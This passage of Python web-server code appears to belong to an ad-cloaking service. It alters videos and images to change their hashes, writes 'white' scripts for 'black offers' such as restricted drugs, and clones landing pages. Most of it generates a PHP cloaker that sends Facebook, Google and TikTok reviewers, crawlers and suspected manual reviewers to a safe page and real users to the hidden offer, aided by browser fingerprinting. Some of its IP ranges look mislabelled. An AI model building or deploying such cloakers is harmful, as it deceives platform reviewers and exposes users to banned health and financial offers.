        img.save(out_path, format="JPEG", quality=95)
        return {
            "status": "success",
            "filename": out_filename,
            "preview_url": f"/api/download/{out_filename}",
            "niche": niche
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def create_white_padding_cover(niche: str = "", custom_text: str = "") -> Image.Image:
    """Gera um quadro institucional por modelo visual."""
    w, h = 720, 1280
    bg = (248, 250, 252) # Clean off-white
    
    img = Image.new("RGB", (w, h), color=bg)
    draw = ImageDraw.Draw(img)
    
    # Gradiente sutil
    for y in range(h):
        r = int(248 - (y / h) * 8)
        g = int(250 - (y / h) * 6)
        b = int(252 - (y / h) * 4)
        draw.line([(0, y), (w, y)], fill=(r, g, b))
        
    # Card central branco com sombra sutil
    card_x1, card_y1, card_x2, card_y2 = 40, 280, w - 40, h - 280
    draw.rounded_rectangle([card_x1, card_y1, card_x2, card_y2], radius=32, fill=(255, 255, 255), outline=(226, 232, 240), width=2)
    
    # Badge superior "CANAL OFICIAL"
    badge_w, badge_h = 420, 52
    bx1 = (w - badge_w) // 2
    by1 = card_y1 + 50
    draw.rounded_rectangle([bx1, by1, bx1 + badge_w, by1 + badge_h], radius=26, fill=(240, 253, 244), outline=(187, 247, 208), width=2)
    
    font_badge = get_font(20, bold=True)
    font_h1 = get_font(34, bold=True)
    font_h2 = get_font(26, bold=True)
    font_sub = get_font(20, bold=False)
    font_btn = get_font(22, bold=True)
    
    b_txt = "✓ CANAL OFICIAL DE ATENDIMENTO"
    bb = draw.textbbox((0, 0), b_txt, font=font_badge)
    draw.text(((w - (bb[2] - bb[0])) // 2, by1 + 14), b_txt, font=font_badge, fill=(22, 101, 52))
    
    # Ícone WhatsApp / Atendimento (Círculo Verde)
    icon_cy = card_y1 + 220
    icon_r = 65
    draw.ellipse([(w // 2) - icon_r, icon_cy - icon_r, (w // 2) + icon_r, icon_cy + icon_r], fill=(37, 211, 102))
    # Ícone simples dentro
    draw.ellipse([(w // 2) - 45, icon_cy - 45, (w // 2) + 45, icon_cy + 45], fill=(255, 255, 255))
    draw.ellipse([(w // 2) - 35, icon_cy - 35, (w // 2) + 35, icon_cy + 35], fill=(37, 211, 102))
    
    # Textos institucionais para revisao antes da publicacao.
    h1_txt = "ATENDIMENTO EXCLUSIVO"
    h1_b = draw.textbbox((0, 0), h1_txt, font=font_h1)
    draw.text(((w - (h1_b[2] - h1_b[0])) // 2, icon_cy + 100), h1_txt, font=font_h1, fill=(15, 23, 42))
    
    h2_txt = custom_text.upper() if custom_text else "FALE DIRETAMENTE COM NOSSA EQUIPE"
    text_y = _wrapped_center(draw, h2_txt, icon_cy + 155, font_h2, (37, 211, 102), 580, w, 34)
    
    sub_txt = "Toque no botão abaixo para tirar dúvidas e conferir condições"
    _wrapped_center(draw, sub_txt, text_y + 18, font_sub, (100, 116, 139), 580, w, 28)
    
    # Botão CTA Verde WhatsApp
    btn_w, btn_h = 560, 76
    btn_x = (w - btn_w) // 2
    btn_y = card_y2 - 120
    draw.rounded_rectangle([btn_x, btn_y, btn_x + btn_w, btn_y + btn_h], radius=22, fill=(37, 211, 102))
    
    btn_txt = "CONVERSAR NO WHATSAPP"
    btn_b = draw.textbbox((0, 0), btn_txt, font=font_btn)
    draw.text(((w - (btn_b[2] - btn_b[0])) // 2, btn_y + 24), btn_txt, font=font_btn, fill=(255, 255, 255))
    
    # Micro ruído de alta frequência
    for _ in range(500):
        rx = random.randint(0, w - 1)
        ry = random.randint(0, h - 1)
        img.putpixel((rx, ry), (random.randint(240, 255), random.randint(240, 255), random.randint(240, 255)))
        
    return img

@app.post("/api/camouflage/video")
async def camouflage_video(
    file: UploadFile = File(...),
    level: str = Form("normal"),
    cover_mode: str = Form("none"), # none, ai, upload
    niche: str = Form(""),
    custom_title: str = Form(""),
    generated_cover: str = Form(""),
    timeline_padding: bool = Form(False),
    padding_seconds: int = Form(610), # 10m 10s
    extension_minutes: int | None = Form(None),
    cover_file: UploadFile = File(None),
    cover_image: UploadFile = File(None),
    cloak_level: str = Form("normal")
):
    if cloak_level not in media_cloak.LEVELS:
        raise HTTPException(400, "Nivel de camuflagem invalido.")
    if Path(file.filename or "").suffix.lower() not in {".mp4", ".mov", ".webm"}:
        raise HTTPException(400, "Use MP4, MOV ou WEBM.")
    if cover_mode not in {"none", "ai", "upload"} or not 10 <= padding_seconds <= 1800:
        raise HTTPException(400, "Confira o modo de capa e a duracao solicitada (10 a 1800 segundos).")
    if timeline_padding and extension_minutes is not None and not 1 <= extension_minutes <= 30:
        raise HTTPException(400, "Escolha de 1 a 30 minutos adicionais para o video.")
    if cover_image is not None:
        cover_file = cover_image
        cover_mode = "upload"
    raw_video_path = out_path = None
    created_cover = None
    completed = False
    try:
        raw_video_filename = f"_tmp_raw_{secrets.token_hex(8)}.mp4"
        raw_video_path = os.path.join(processed_directory(), raw_video_filename)
        await _save_cloak_upload(file, raw_video_path, 300 * 1024 * 1024)
            
        out_filename = f"cads_cloak_video_{cloak_level}_{secrets.token_hex(8)}.mp4"
        out_path = os.path.join(processed_directory(), out_filename)
        
        ffmpeg_exe = imageio_ffmpeg.get_ffmpeg_exe()
        ffmpeg_success = False
        
        cover_info = None
        cover_path = None
        
        # 1. Definir ou Gerar a Capa / Frame White
        if generated_cover:
            safe_cover = os.path.basename(generated_cover)
            ready_path = os.path.join(processed_directory(), safe_cover)
            if os.path.exists(ready_path):
                cover_path = ready_path
                cover_info = {
                    "type": "ai_generated",
                    "filename": safe_cover,
                    "download_url": f"/api/download/{quote(safe_cover)}",
                    "niche": niche,
                }
        if not cover_path and cover_mode == "ai":
            cover_img = create_niche_cover_image(niche or "emagrecimento", custom_title)
            cover_filename = f"cads_capa_ia_{int(time.time())}_{random.randint(1000,9999)}.jpg"
            cover_path = os.path.join(processed_directory(), cover_filename)
            cover_img.save(cover_path, format="JPEG", quality=96)
            created_cover = cover_path
            cover_info = {"type": "ai_generated", "filename": cover_filename, "download_url": f"/api/download/{cover_filename}", "niche": niche or "emagrecimento"}
        elif not cover_path and cover_mode == "upload" and cover_file:
            cover_content = await cover_file.read(20 * 1024 * 1024 + 1)
            if len(cover_content) > 20 * 1024 * 1024:
                raise HTTPException(413, "A capa deve ter no maximo 20 MB.")
            with Image.open(io.BytesIO(cover_content)) as image:
                if image.format not in {"JPEG", "PNG", "WEBP"} or image.width * image.height > 25_000_000:
                    raise HTTPException(400, "Capa invalida: use JPG, PNG ou WEBP de ate 25 megapixels.")
                cover_img = ImageOps.exif_transpose(image).convert("RGB")
            cover_filename = f"cads_capa_custom_{secrets.token_hex(8)}.jpg"
            cover_path = os.path.join(processed_directory(), cover_filename)
            cover_img.save(cover_path, format="JPEG", quality=96)
            created_cover = cover_path
            cover_info = {"type": "custom_upload", "filename": cover_filename, "download_url": f"/api/download/{cover_filename}"}
        elif not cover_path and timeline_padding:
            # Gerar Frame White Institucional para o Timeline Padding
            cover_img = create_white_padding_cover(niche, custom_title)
            cover_filename = f"cads_white_frame_{int(time.time())}_{random.randint(1000,9999)}.jpg"
            cover_path = os.path.join(processed_directory(), cover_filename)
            cover_img.save(cover_path, format="JPEG", quality=95)
            created_cover = cover_path
            cover_info = {"type": "white_padding_frame", "filename": cover_filename, "download_url": f"/api/download/{cover_filename}"}

        # 2. Obter duração do vídeo de entrada
        probe_duration, _ = probe_media(ffmpeg_exe, raw_video_path)

        # 3. Capa no começo do vídeo + padding no final (se ligado)
        if os.path.exists(ffmpeg_exe) and cover_path and os.path.exists(cover_path):
            try:
                pad_time = max(10, int(padding_seconds - probe_duration)) if timeline_padding else 0
                if timeline_padding and extension_minutes is not None:
                    pad_time = extension_minutes * 60 - 4
                ffmpeg_success = apply_timeline_padding(
                    ffmpeg_exe, raw_video_path, cover_path, out_path, pad_time, intro_seconds=4
                )
            except Exception as e:
                print("Erro no FFmpeg Timeline Padding:", e)

        # Fallback se timeline padding falhou ou foi desativado
        if not ffmpeg_success and not cover_path:
            # The final cloak stage converts the container, including VP8/WEBM inputs.
            shutil.copyfile(raw_video_path, out_path)
            ffmpeg_success = True
        if not ffmpeg_success:
            if cover_path and os.path.exists(cover_path) and os.path.exists(ffmpeg_exe):
                try:
                    cmd = [
                        ffmpeg_exe, "-y",
                        "-i", raw_video_path,
                        "-i", cover_path,
                        "-map", "0",
                        "-map", "1",
                        "-c", "copy",
                        "-disposition:v:1", "attached_pic",
                        out_path
                    ]
                    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=25)
                    if res.returncode == 0 and os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                        ffmpeg_success = True
                except Exception as e:
                    print("Erro no FFmpeg embed:", e)

        if not ffmpeg_success or not os.path.exists(out_path):
            for partial in (raw_video_path, out_path):
                if os.path.isfile(partial):
                    os.remove(partial)
            raise HTTPException(422, "Nao foi possivel processar o video. Confira o formato e tente outro arquivo.")
        await run_in_threadpool(media_cloak.cloak_video, out_path, out_path, cloak_level)
        actual_duration, _ = probe_media(ffmpeg_exe, out_path)
        if timeline_padding and extension_minutes is not None and abs(actual_duration - probe_duration - extension_minutes * 60) > 2:
            for partial in (raw_video_path, out_path):
                if os.path.isfile(partial):
                    os.remove(partial)
            raise HTTPException(422, "Nao foi possivel aplicar o tempo de extensao solicitado. Tente novamente.")
                
        # Limpar arquivo temporário bruto
        if os.path.exists(raw_video_path):
            try:
                os.remove(raw_video_path)
            except Exception:
                pass

        with open(out_path, "rb") as f:
            new_hash = hashlib.sha256(f.read()).hexdigest()
            
        stats_state()["processed_today"] += 1
        stats_state()["protected_files"] += 1
        stats_state()["plan_used"] += 1
        stats_state()["video_cloaked_today"] = stats_state().get("video_cloaked_today", 0) + 1
        push_activity(
            file.filename,
            "video",
            f"Vídeo {actual_duration:.2f}s · clique para baixar",
            "video",
            out_filename,
        )
            
        completed = True
        return {
            "status": "success",
            "filename": out_filename,
            "download_url": f"/api/download/{out_filename}",
            "level": level,
            "duration": f"{actual_duration:.2f} segundos",
            "duration_seconds": actual_duration,
            "new_sha256": new_hash,
            "new_hash": new_hash,
            "cover": cover_info
        }
    except HTTPException:
        raise
    except subprocess.TimeoutExpired:
        raise HTTPException(504, "O processamento excedeu 300 segundos.") from None
    except media_cloak.InvalidMedia:
        raise HTTPException(422, "Arquivo de midia invalido ou nao suportado.") from None
    except (UnidentifiedImageError, Image.DecompressionBombError):
        raise HTTPException(400, "Imagem de capa invalida.") from None
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        for path in (raw_video_path, out_path if not completed else None,
                     created_cover if not completed else None):
            if path and os.path.isfile(path):
                os.remove(path)
        await file.close()
        if cover_file is not None:
            await cover_file.close()

@app.post("/api/scripts/generate-white-script")
async def generate_white_script(
    black_offer: str = Form(...),
    niche: str = Form("emagrecimento")
):
    """Adapta modelos de roteiro ao produto, sem prever aprovacao."""
    offer = black_offer.strip()
    if not 1 <= len(offer) <= 120:
        raise HTTPException(400, "Informe o produto em ate 120 caracteres.")
    templates = [
        {
            "title": "Opção 1: Apresentação",
            "script": f"Conheça {offer}. Consulte as características e condições de compra com nossa equipe pelo WhatsApp.",
            "cta": "Enviar Mensagem no WhatsApp"
        },
        {
            "title": "Opção 2: Curiosidade & Condição Especial",
            "script": f"Quer saber mais sobre {offer}? Fale com nossa equipe para conferir os detalhes, o preço e a disponibilidade.",
            "cta": "Falar com Atendimento"
        },
        {
            "title": "Opção 3: Atendimento Direto / Suporte VIP",
            "script": f"Tem dúvidas sobre {offer}? Entre em contato pelo WhatsApp e confira as informações do produto antes de decidir.",
            "cta": "Iniciar Conversa Oficial"
        }
    ]
    for template in templates:
        template["duration"] = f"Cerca de {round(len(template['script'].split()) / 2.5)}s; varia conforme a leitura"
    return {"status": "success", "templates": templates,
            "notice": "Modelos prontos para revisao. Sem garantia de aprovacao ou conversao."}


@app.post("/api/camouflage/text-to-image")
async def text_to_image(
    text: str = Form(...),
    theme: str = Form("dark") # dark ou yellow
):
    try:
        # Renderiza texto em um card visual.
        w, h = 800, 500
        bg_color = (15, 20, 30) if theme == "dark" else (255, 245, 200)
        text_color = (255, 255, 255) if theme == "dark" else (20, 20, 20)
        
        img = Image.new("RGB", (w, h), color=bg_color)
        draw = ImageDraw.Draw(img)
        
        # Borda sutil de card
        draw.rectangle([10, 10, w - 10, h - 10], outline=(255, 255, 255, 30) if theme == "dark" else (200, 180, 100), width=2)
        
        # Quebra de linha básica
        words = text.split()
        lines = []
        cur_line = []
        for word in words:
            cur_line.append(word)
            if len(" ".join(cur_line)) > 35:
                lines.append(" ".join(cur_line))
                cur_line = []
        if cur_line:
            lines.append(" ".join(cur_line))
            
        y_text = 60
        for line in lines[:8]:
            draw.text((40, y_text), line, fill=text_color)
            y_text += 45
            
        # Adiciona variacao visual ao card.
        for _ in range(300):
            rx = random.randint(0, w - 1)
            ry = random.randint(0, h - 1)
            img.putpixel((rx, ry), (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
            
        out_filename = f"cads_text_image_{int(time.time())}.jpg"
        out_path = os.path.join(processed_directory(), out_filename)
        img.save(out_path, format="JPEG", quality=95)
        
        with open(out_path, "ab") as f:
            f.write(os.urandom(32))
            
        stats_state()["processed_today"] += 1
        stats_state()["protected_files"] += 1
        push_activity("Texto em imagem", "text", "Card visual · clique para baixar", "type", out_filename)
        
        return {
            "status": "success",
            "filename": out_filename,
            "download_url": f"/api/download/{out_filename}",
            "message": "Texto convertido em imagem. Ferramentas de OCR podem reconhecer o texto."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/clone/page")
async def clone_page(page_url: str = Form(...)):
    try:
        req = urllib.request.Request(
            page_url, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        with urllib.request.urlopen(req, timeout=12) as response:
            html_content = response.read().decode('utf-8', errors='ignore')
            
        out_filename = f"cloned_{int(time.time())}.html"
        out_path = os.path.join(processed_directory(), out_filename)
        
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(html_content)
            
        stats_state()["processed_today"] += 1
        push_activity(f"Página Clonada ({page_url[:30]}...)", "clone", "Clonador · clique para baixar", "copy", out_filename)
        
        return {
            "status": "success",
            "filename": out_filename,
            "download_url": f"/api/download/{out_filename}",
            "html_length": len(html_content),
            "message": "Página clonada com sucesso! Você pode baixar o arquivo HTML ou editar os botões de checkout."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro ao clonar página: {str(e)}")

@app.post("/api/metadata/clean")
async def clean_metadata(file: UploadFile = File(...)):
    extension = os.path.splitext(file.filename or "")[1].lower()
    if extension not in {".jpg", ".jpeg", ".png", ".webp", ".mp4", ".mov", ".mkv", ".webm"}:
        raise HTTPException(415, "Use JPG, PNG, WEBP, MP4, MOV, MKV ou WEBM.")
    content = await file.read(100 * 1024 * 1024 + 1)
    if len(content) > 100 * 1024 * 1024:
        raise HTTPException(413, "O arquivo deve ter no maximo 100 MB.")
    out_filename = f"clean_{secrets.token_hex(8)}{extension}"
    out_path = os.path.join(processed_directory(), out_filename)
    try:
        if extension in {'.jpg', '.jpeg', '.png', '.webp'}:
            with Image.open(io.BytesIO(content)) as source:
                if source.width * source.height > 25_000_000:
                    raise HTTPException(400, "A imagem deve ter no maximo 25 megapixels.")
                image = ImageOps.exif_transpose(source).convert("RGB")
                clean_img = Image.new("RGB", image.size)
                clean_img.paste(image)
                clean_img.save(out_path, quality=98)
        else:
            with tempfile.TemporaryDirectory(prefix="cads-metadata-") as temporary:
                raw_path = os.path.join(temporary, "source" + extension)
                with open(raw_path, "wb") as source:
                    source.write(content)
                result = run_ffmpeg([imageio_ffmpeg.get_ffmpeg_exe(), "-y", "-i", raw_path,
                                     "-map", "0", "-c", "copy", "-map_metadata", "-1",
                                     "-map_metadata:s", "-1", "-map_chapters", "-1", out_path], timeout=120)
                if result.returncode != 0:
                    raise HTTPException(422, "Nao foi possivel limpar este video. Confira o formato do arquivo.")
                
        stats_state()["processed_today"] += 1
        stats_state()["protected_files"] += 1
        push_activity(file.filename, "metadata", "Metadados removidos · clique para baixar", "settings", out_filename)
        
        return {
            "status": "success",
            "filename": out_filename,
            "download_url": f"/api/download/{out_filename}",
            "message": "Metadados descritivos removidos. Informacoes tecnicas do formato podem permanecer."
        }
    except (UnidentifiedImageError, Image.DecompressionBombError):
        raise HTTPException(400, "Imagem invalida.") from None
    except HTTPException:
        if os.path.isfile(out_path):
            os.remove(out_path)
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/compliance/analyze")
async def analyze_compliance(copy_text: str = Form(...)):
    black_triggers = {
        "anabolizante": "Termo de substancia controlada; requer revisao",
        "durateston": "Medicamento controlado sujeito a receita",
        "trembolona": "Substância proibida em anúncios",
        "oxandrolona": "Substância anabólica restrita",
        "tirzepatida": "Medicamento injetável / promessa médica",
        "retatrutida": "Molécula em fase de pesquisa",
        "emagrecer 10kg": "Promessa irreal de perda de peso em curto prazo",
        "secar barriga": "Gatilho de saúde e aparência física proibido",
        "perca peso dormindo": "Alegação médica/saúde enganosa",
        "cura definitiva": "Promessa milagrosa proibida",
        "sem dieta e sem treino": "Alegação enganosa de resultado sem esforço",
        "antes e depois": "Comparativo visual/físico direto restrito",
        "anvisa proibiu": "Menção a órgãos reguladores de forma sensacionalista",
        "dinheiro fácil": "Esquema financeiro / renda enganosa",
        "fique rico": "Promessa exagerada de ganho financeiro",
        "clique aqui seu pobre": "Linguagem ofensiva / discriminatória"
    }
    
    found_triggers = []
    text_lower = copy_text.lower()
    
    if not copy_text.strip() or len(copy_text) > 10000:
        raise HTTPException(400, "Informe um texto de ate 10.000 caracteres.")
    score = 0
    for trigger, reason in black_triggers.items():
        if re.search(r'\b' + re.escape(trigger) + r'\b', text_lower):
            found_triggers.append({"word": trigger, "reason": reason})
            score += 25
            
    score = min(100, score)
    
    if score >= 75:
        risk_level = "CRÍTICO"
        color = "#EF4444"
        recommendation = "Varios termos da lista local foram encontrados. Revise o conteudo e as politicas da plataforma. Esta pontuacao nao preve aprovacao."
    elif found_triggers:
        risk_level = "MÉDIO"
        color = "#F59E0B"
        recommendation = "Foram encontrados termos que exigem revisao. Trocar palavras nao torna um produto ou uma alegacao permitidos."
    else:
        risk_level = "BAIXO"
        color = "#10B981"
        recommendation = "Nenhum termo da lista local foi encontrado. Isso nao comprova conformidade nem garante aprovacao do anuncio."
        
    safe_rewrite = copy_text
    return {
        "risk_score": score,
        "risk_level": risk_level,
        "color": color,
        "recommendation": recommendation,
        "found_triggers": found_triggers,
        "safe_rewrite": safe_rewrite
    }

@app.post("/api/cloaker/generate")
async def generate_cloaker(
    safe_url: str = Form(...),
    offer_url: str = Form(...),
    filter_type: str = Form("strict"),
    target_countries: str = Form(""),
    target_devices: str = Form(""),
    target_os: str = Form(""),
    target_languages: str = Form(""),
    target_referrers: str = Form("")
):
    # Parse targeting options
    countries = [c.strip().lower() for c in target_countries.split(',') if c.strip()] if target_countries else []
    devices = [d.strip().lower() for d in target_devices.split(',') if d.strip()] if target_devices else []
    os_list = [o.strip().lower() for o in target_os.split(',') if o.strip()] if target_os else []
    languages = [l.strip().lower() for l in target_languages.split(',') if l.strip()] if target_languages else []
    referrers = [r.strip().lower() for r in target_referrers.split(',') if r.strip()] if target_referrers else []

    php_code = f"""<?php
/**
 * CLOAKER CAMOUFLAGE ADS (CADS) - ANTI-BOT ADVANCED ENGINE v3.1 ENTERPRISE + GEO TARGETING
 * Safe Page: {safe_url}
 * Offer Page: {offer_url}
 * Features: IP Range Validation, Cookie Check, Browser Fingerprinting, JS Check, Random Delay, Geo/Device/OS/Language Targeting
 */

// Anti-cache headers
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$referrer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$accept_language = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

// === SAFE PAGE E OFFER PAGE ===
$safe_page = '{safe_url}';
$offer_page = '{offer_url}';

// === CONFIGURAÇÃO DE TARGETING (País, Dispositivo, OS, Idioma, Origem) ===
$allowed_countries = {json.dumps(countries)};
$allowed_devices = {json.dumps(devices)};
$allowed_os = {json.dumps(os_list)};
$allowed_languages = {json.dumps(languages)};
$allowed_referrers = {json.dumps(referrers)};

// Função pra detectar país via IP (usando ipinfo.io ou similar)
function getCountryFromIP($ip) {{
    // Cache simples em arquivo pra não gastar API
    $cache_file = __DIR__ . '/ip_cache_' . md5($ip) . '.txt';
    if (file_exists($cache_file) && (time() - filemtime($cache_file)) < 86400) {{
        return trim(file_get_contents($cache_file));
    }}
    try {{
        $url = "http://ipinfo.io/$ip/country";
        $country = trim(file_get_contents($url));
        file_put_contents($cache_file, $country);
        return strtolower($country);
    }} catch (Exception $e) {{
        return '';
    }}
}}

// Detectar dispositivo
function detectDevice($ua) {{
    if (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false) return 'mobile';
    if (strpos($ua, 'tablet') !== false || strpos($ua, 'ipad') !== false) return 'tablet';
    return 'desktop';
}}

// Detectar OS
function detectOS($ua) {{
    if (strpos($ua, 'windows') !== false) return 'windows';
    if (strpos($ua, 'mac') !== false || strpos($ua, 'macintosh') !== false) return 'macos';
    if (strpos($ua, 'linux') !== false) return 'linux';
    if (strpos($ua, 'android') !== false) return 'android';
    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false) return 'ios';
    return 'other';
}}

// Detectar idioma
function detectLanguage($accept_lang) {{
    $langs = explode(',', $accept_lang);
    if (!empty($langs)) {{
        $primary = explode('-', trim($langs[0]));
        return strtolower($primary[0]);
    }}
    return '';
}}

// === VERIFICAÇÃO DE TARGETING ===
$is_targeted = true;

// Checar país (se configurado)
if (!empty($allowed_countries)) {{
    $user_country = getCountryFromIP($ip);
    if (!in_array($user_country, $allowed_countries)) {{
        $is_targeted = false;
    }}
}}

// Checar dispositivo (se configurado)
if (!empty($allowed_devices)) {{
    $user_device = detectDevice($user_agent);
    if (!in_array($user_device, $allowed_devices)) {{
        $is_targeted = false;
    }}
}}

// Checar OS (se configurado)
if (!empty($allowed_os)) {{
    $user_os = detectOS($user_agent);
    if (!in_array($user_os, $allowed_os)) {{
        $is_targeted = false;
    }}
}}

// Checar idioma (se configurado)
if (!empty($allowed_languages)) {{
    $user_lang = detectLanguage($accept_language);
    if (!in_array($user_lang, $allowed_languages)) {{
        $is_targeted = false;
    }}
}}

// Checar referrer/origem (se configurado)
if (!empty($allowed_referrers)) {{
    $referrer_match = false;
    foreach ($allowed_referrers as $ref) {{
        if (strpos($referrer, $ref) !== false) {{
            $referrer_match = true;
            break;
        }}
    }}
    if (!$referrer_match) {{
        $is_targeted = false;
    }}
}}

// Se não passou no targeting, manda pra safe page
if (!$is_targeted) {{
    header('HTTP/1.1 302 Found');
    header('Location: ' . $safe_page);
    exit();
}}

// === DETECÇÃO DE BOT POR USER-AGENT ===
$bot_signatures = [
    'facebookexternalhit', 'facebot', 'meta-externalagent',
    'tiktokbot', 'bytedance', 'bytespider',
    'googlebot', 'mediapartners-google', 'adsbot-google',
    'crawler', 'spider', 'robot', 'headlesschrome', 'lighthouse',
    'screaming frog', 'ahrefsbot', 'semrushbot', 'mj12bot',
    'dotbot', 'baiduspider', 'yandexbot', 'sogou', 'duckduckbot',
    'phantomjs', 'selenium', 'puppeteer', 'playwright'
];

$is_bot = false;
foreach ($bot_signatures as $bot) {{
    if (strpos($user_agent, $bot) !== false) {{
        $is_bot = true;
        break;
    }}
}}

// UA vazio ou muito curto = bot
if (empty($user_agent) || strlen($user_agent) < 15) {{
    $is_bot = true;
}}

// === VALIDAÇÃO DE IP POR RANGES ASN (META/FACEBOOK) ===
function ipInRange($ip, $range) {{
    list($subnet, $bits) = explode('/', $range);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    return ($ip_long & $mask) == ($subnet_long & $mask);
}}

function isFacebookIP($ip) {{
    $fb_ranges = [
        '69.63.176.0/20', '66.220.144.0/20', '69.171.224.0/19',
        '74.119.76.0/22', '173.252.64.0/18', '31.13.24.0/21',
        '31.13.64.0/18', '157.240.0.0/17', '129.134.0.0/17'
    ];
    foreach ($fb_ranges as $range) {{
        if (ipInRange($ip, $range)) return true;
    }}
    return false;
}}

function isGoogleIP($ip) {{
    $google_ranges = [
        '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18',
        '209.85.128.0/17', '216.239.32.0/19', '64.18.0.0/20'
    ];
    foreach ($google_ranges as $range) {{
        if (ipInRange($ip, $range)) return true;
    }}
    return false;
}}

function isTikTokIP($ip) {{
    $tt_ranges = [
        '150.171.0.0/16', '23.32.0.0/11', '104.64.0.0/10'
    ];
    foreach ($tt_ranges as $range) {{
        if (ipInRange($ip, $range)) return true;
    }}
    return false;
}}

// === BYPASS CLOUDFLARE BOT MANAGEMENT (__cf_bm + cf_clearance) ===
// Cloudflare usa cookie __cf_bm pra marcar bots e cf_clearance pra quem passou no challenge
$has_cf_bm = isset($_COOKIE['__cf_bm']) && strlen($_COOKIE['__cf_bm']) > 20;
$has_cf_clearance = isset($_COOKIE['cf_clearance']) && strlen($_COOKIE['cf_clearance']) > 20;
$cf_ray = $_SERVER['HTTP_CF_RAY'] ?? '';
$cf_connecting_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? '';
$cf_ip_country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '';
// Se tem cf_clearance = passou no challenge humano = provavelmente real
// Se tem __cf_bm mas SEM cf_clearance = bot marcado pelo Cloudflare
$is_cf_bot = ($has_cf_bm && !$has_cf_clearance);
// Se veio via Cloudflare (cf-ray presente) mas sem cookies CF = suspeito
$is_cf_suspicious = (!empty($cf_ray) && !$has_cf_bm && !$has_cf_clearance);

// Se o IP pertence ao Facebook, Google ou TikTok, é bot/revisor
if (isFacebookIP($ip) || isGoogleIP($ip) || isTikTokIP($ip)) {{
    $is_bot = true;
}}

// === DETECÇÃO DE REVISOR MANUAL DO FACEBOOK (COOKIE CHECK) ===
$has_fb_cookie = isset($_COOKIE['_fbp']) || isset($_COOKIE['_fbc']);
$is_fb_referrer = (strpos($referrer, 'facebook.com') !== false ||
                   strpos($referrer, 'fb.com') !== false ||
                   strpos($referrer, 'm.facebook.com') !== false ||
                   strpos($referrer, 'l.facebook.com') !== false);

// Veio do referrer do Face sem cookie de tracking = suspeito de revisor manual
$is_manual_reviewer = ($is_fb_referrer && !$has_fb_cookie && !$is_bot);

// === CHECAGEM DE JAVASCRIPT EXECUTADO (Bot não roda JS) ===
$has_js_cookie = isset($_COOKIE['js_enabled']) && $_COOKIE['js_enabled'] === '1';
// Se veio do referrer do Face/TikTok mas sem cookie JS = bot headless
if (($is_fb_referrer || strpos($referrer, 'tiktok.com') !== false) && !$has_js_cookie && !$is_bot) {{
    $is_bot = true;
}}

// === BROWSER FINGERPRINTING CHECK (Canvas, WebGL, AudioContext) ===
$has_fingerprint = isset($_COOKIE['fp_hash']) && strlen($_COOKIE['fp_hash']) >= 16;
// Humano real tem fingerprint único gerado via JS; bot não tem
if (!$has_fingerprint && !$is_bot && strpos($referrer, 'facebook.com') !== false) {{
    // Suspeito mas não bloqueia direto - loga pra análise
    $is_suspicious = true;
}} else {{
    $is_suspicious = false;
}}

// === DELAY ALEATÓRIO NO REDIRECT (Anti-Pattern Detection) ===
// Bots seguem redirect instantâneo (0ms). Humanos têm delay natural.
usleep(rand(50000, 300000)); // 50-300ms de delay aleatório

// === LOG DE ACESSO COMPLETO ===
$log_entry = date('Y-m-d H:i:s') . " | IP: $ip | UA: " . substr($user_agent, 0, 120) .
             " | Bot: " . ($is_bot ? 'YES' : 'NO') .
             " | ManualReview: " . ($is_manual_reviewer ? 'YES' : 'NO') .
             " | JS: " . ($has_js_cookie ? 'YES' : 'NO') .
             " | FP: " . ($has_fingerprint ? 'YES' : 'NO') .
             " | Suspicious: " . ($is_suspicious ? 'YES' : 'NO') .
             " | Ref: " . substr($referrer, 0, 80) . "\\n";
@file_put_contents(__DIR__ . '/cloaker_log.txt', $log_entry, FILE_APPEND);

// === DECISÃO FINAL ===
if ($is_bot || $is_manual_reviewer) {{
    header('HTTP/1.1 302 Found');
    header('Location: ' . $safe_page);
    exit();
}} else {{
    // Set cookies pra próxima visita (JS check + fingerprint placeholder)
    if (!isset($_COOKIE['js_enabled'])) {{
        setcookie('js_enabled', '1', time() + 86400, '/');
    }}
    header('HTTP/1.1 302 Found');
    header('Location: ' . $offer_page);
    exit();
}}
?>

<!-- JavaScript pra gerar fingerprint e cookie JS (incluir na safe page) -->
<script>
// Canvas Fingerprinting
function getCanvasFingerprint() {{
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('CADS Pro Fingerprint', 2, 2);
    return canvas.toDataURL().slice(-50);
}}

// WebGL Renderer
function getWebGLRenderer() {{
    try {{
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {{
            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {{
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }}
        }}
    }} catch(e) {{}}
    return 'unknown';
}}

// Audio Context Latency
function getAudioLatency() {{
    try {{
        var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        return audioCtx.baseLatency || 0;
    }} catch(e) {{
        return 0;
    }}
}}

// Gerar hash combinado
